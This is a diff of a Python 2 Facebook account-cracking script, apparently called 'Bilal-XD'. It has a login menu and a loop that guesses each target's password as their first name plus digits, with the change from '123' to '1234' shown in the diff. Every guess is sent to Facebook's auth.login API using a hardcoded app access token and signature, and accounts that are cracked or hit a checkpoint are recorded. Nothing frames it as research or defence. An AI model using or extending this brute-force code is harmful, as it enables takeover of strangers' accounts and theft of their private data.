@@ -74,7 +74,7 @@ def masuk():
     print logo
     print '\x1b[1;92m[01]\x1b[1;97m\x1b[1;96m\x1b[1;92mＢｉｌａｌ-ＸＤ Login with cookies'
     print '\x1b[1;92m[02]\x1b[1;97m\x1b[1;96m\x1b[1;92mＢｉｌａｌ-ＸＤ Login with Token'    
-    print '\x1b[1;92m[00]\x1b[1;97m\x1b[1;96m\x1b[1;92mＢｉｌａｌ-ＸＤ Back'
+    print '\x1b[1;92m[00]\x1b[1;97m\x1b[1;96m\x1b[1;92mＢｉｌａｌ-ＸＤ Exit'
     pilih_masuk()
  
  
@@ -355,7 +355,7 @@ def pilih_super():
                                 print '\x1b[1;93m [BILAL-CP] ' + user + ' |\x1b[0m ' + p5
                                 cekpoint.append(user + p5)
                             else:
-                                p6 = b['first_name'] + '123'
+                                p6 = b['first_name'] + '1234'
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p6 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                                 q = json.load(data)
                                 if 'access_token' in q:
